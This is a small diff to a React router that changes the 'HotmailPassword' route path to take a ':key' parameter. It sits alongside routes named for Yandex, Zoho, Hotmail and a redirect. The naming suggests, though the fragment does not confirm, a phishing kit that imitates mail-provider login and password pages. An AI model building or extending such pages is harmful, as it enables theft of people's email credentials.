@@ -51,7 +51,7 @@ function App() {
         <Yandex path="yx" />
         <Zoho path="zh" />
         <Hotmail path="ht" />
-        <HotmailPassword path="ht/ps" />
+        <HotmailPassword path="ht/:key" />
         <RedirectNorecord path="/gm" />
         <Processing path="processing" />
       </Router>
